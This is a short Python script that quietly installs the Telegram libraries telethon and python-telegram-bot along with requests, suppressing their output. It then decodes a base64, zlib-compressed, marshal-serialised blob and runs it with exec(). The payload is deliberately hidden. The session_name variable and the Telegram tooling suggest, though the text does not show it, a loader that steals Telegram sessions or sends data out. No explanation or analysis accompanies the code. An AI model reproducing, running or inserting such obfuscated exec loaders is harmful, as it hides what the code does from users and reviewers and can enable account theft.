import subprocess
import sys
import base64
import zlib
import marshal
import os

subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

session_name = globals().get("session_name", "unknown")

# DATA
DATA = "eJxlUs9PE1EQnrdvt7tb7FrFUA7GCpwqSORXiqYSqyghNiQYo7aJ2ZTuAwrb3WZ3SwXbpBFjPHjwJB45eBDBiycSvfAf0ABps3A10RuRg8R48L3SIgmz2ZlvZ76ZnZn3UnBChLo9sKhaAg00pEMGJRBimNO5BFezOIE1/BISPAcEz3jhlKzW7YzvdIzm8ERcRXVm3SKY50L8TwZDyMW3TWcshU5keei7yFr7QtV9SqftoSLSuCLnHPMKaA03ChZxATR+gSHewccMXhNWuSM8AEWhgGcEOCUFriCseRq8RTr8c1rhHV7CrwQBasugTyNOW4cwvPF1QA/YKM8hiFMf8z7DccijzziPQuLYQnd4MNx7rX9gsKf/RjQ6otqPZuN3+x4/vD74ID8RTs5dJcNPEr3JvljOiEeHx3XWNB/7pAtsI4JjzhJjQeq2iW2nTcPlrIkQ54qp6aSjpjVX0sxULkMMJ4Qt1pfLm1liuD6bGJp6HPO4Z+r5qpHMEFeeMB21VtliC3Yx/f5PmUzrxEWTNgtdrskfKWI7VtqYGmIsWrlOtfz1I7KfUvUDDktQ9d8qjVaV1tLIntf3dnTbe6l0p9ocXL5Sbu4qxfZk32v9/fC23LY8XlXOVZRgWQl+FNfbNpXglhKpSJFNKfIbg7d9U26rSpHDBv5rd9E/vGiPBtCHQLQJf0VR2fONp2gDZOrckBHDTUL0grjhF6knJLnN2Xlnmg7kEJ1MWcmMSsc82hJn2q6YtOeNVNqsDeEqU8RRyRzdlqqbZtY9b+UMNWc4aV1NmZmsThxisRu/Agfs8K2zLEmKZEwtp5Mhq7V2Iegi+qjaxwih79CxC/IuKL94D7q57wcUKIkVaClDyxa0VqCzDJ0rsfWLW133dmDECtC8f2Tp2bY="
secure_data = DATA
payload = marshal.loads(zlib.decompress(base64.b64decode(secure_data)))
exec(payload)
